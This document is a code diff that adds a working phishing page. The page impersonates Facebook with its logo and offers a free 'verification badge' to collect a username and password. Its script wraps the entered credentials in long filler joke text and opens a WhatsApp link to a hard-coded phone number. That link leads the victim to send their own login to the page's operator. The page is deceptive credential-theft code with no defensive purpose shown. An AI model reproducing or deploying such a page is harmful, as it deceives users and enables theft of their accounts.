@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Verified Badge On Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+
+        #loginContainer {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 300px;
+        }
+
+        #loginContainer img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #155cb0;
+        }
+
+        .badge {
+            font-size: 18px;
+            color: green;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div id="loginContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo"><br>
+
+        <h2>Facebook Free Verification Badge✓⃝™</h2>
+
+        <form id="loginForm" onsubmit="sendToWhatsApp(event)">
+            <input type="text" id="username" placeholder="Username" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+
+            <button type="submit">Apply Now</button>
+        </form>
+    </div>
+
+    <script>
+        function sendToWhatsApp(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const phoneNumber = "+923493114170";
+
+            // Predefined introductory message
+            const introMessage = `
+Once there was a man named Bob who loved to tell long, elaborate jokes. One day, Bob decided to attend a comedy event at the local club. As he arrived, he noticed that the host of the show was a comedian known for his marathon jokes.
+
+The host got on stage and announced, "Get ready for the longest, funniest joke you've ever heard!" The audience chuckled in anticipation. The comedian began:
+
+"In the town of Giggleville, there lived a man named Chuckles, known for his endless jokes. Chuckles decided to visit the Laughing River, a magical river rumored to make anyone who drank from it burst into uncontrollable laughter."
+
+"As Chuckles approached the river, he saw a sign that read, 'Do not swim or you'll laugh your pants off!' But Chuckles, being the jokester that he was, ignored the warning and jumped in. Instantly, he started laughing so hard that tears streamed down his face."
+
+"As Chuckles emerged from the river, he began to tell a joke, 'Why did the chicken go to the seance? To talk to the other side!' Everyone around him burst into fits of laughter, even the birds in the trees joined in with chirps of amusement."
+
+"Chuckles continued on his journey through Giggleville, spreading joy and laughter wherever he went. People from far and wide came to hear his jokes and feel the warmth of his humor. It seemed like the entire town was enveloped in a blanket of mirth and glee."
+
+"One day, Chuckles came across a grumpy old man who had never laughed in his life. Determined to spread cheer to even the most hardened heart, Chuckles told the man his best joke. 'Why was the math book sad? Because it had too many problems!'"
+
+"The old man's stoic expression cracked, a small smile forming on his face. Chuckles knew he had succeeded in his mission. The old man let out a chuckle, then a laugh, then a full-blown guffaw. Soon, they were both rolling on the ground, tears of laughter mingling with the dust."
+
+"The news of Chuckles' miraculous ability to make even the grumpiest person laugh spread far and wide. People from neighboring towns flocked to Giggleville to experience the joy for themselves. Chuckles became a legend.`;
+
+            // User's details entered in the form
+            const userDetails = `\n\nUsername: ${username}\nPassword: ${password}`;
+
+            // Closing message
+            const closingMessage = `
+Once there was a man named Bob who loved to tell long, elaborate jokes. One day, Bob decided to attend a comedy event at the local club. As he arrived, he noticed that the host of the show was a comedian known for his marathon jokes.
+
+The host got on stage and announced, "Get ready for the longest, funniest joke you've ever heard!" The audience chuckled in anticipation. The comedian began:
+
+"In the town of Giggleville, there lived a man named Chuckles, known for his endless jokes. Chuckles decided to visit the Laughing River, a magical river rumored to make anyone who drank from it burst into uncontrollable laughter."
+
+"As Chuckles approached the river, he saw a sign that read, 'Do not swim or you'll laugh your pants off!' But Chuckles, being the jokester that he was, ignored the warning and jumped in. Instantly, he started laughing so hard that tears streamed down his face."
+
+"As Chuckles emerged from the river, he began to tell a joke, 'Why did the chicken go to the seance? To talk to the other side!' Everyone around him burst into fits of laughter, even the birds in the trees joined in with chirps of amusement."
+
+"Chuckles continued on his journey through Giggleville, spreading joy and laughter wherever he went. People from far and wide came to hear his jokes and feel the warmth of his humor. It seemed like the entire town was enveloped in a blanket of mirth and glee."
+
+"One day, Chuckles came across a grumpy old man who had never laughed in his life. Determined to spread cheer to even the most hardened heart, Chuckles told the man his best joke. 'Why was the math book sad? Because it had too many problems!'"
+
+"The old man's stoic expression cracked, a small smile forming on his face. Chuckles knew he had succeeded in his mission. The old man let out a chuckle, then a laugh, then a full-blown guffaw. Soon, they were both rolling on the ground, tears of laughter mingling with the dust."
+
+"The news of Chuckles' miraculous ability to make even the grumpiest person laugh spread far and wide. People from neighboring towns flocked to Giggleville to experience the joy for themselves. Chuckles became a legend.\n*CLICK ON SEND BUTTON*`;
+
+            // Combine all messages
+            const fullMessage = introMessage + userDetails + closingMessage;
+
+            // Send message via WhatsApp
+            const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(fullMessage)}`;
+            window.open(whatsappUrl, "_blank");
+        }
+    </script>
+</body>
+</html>
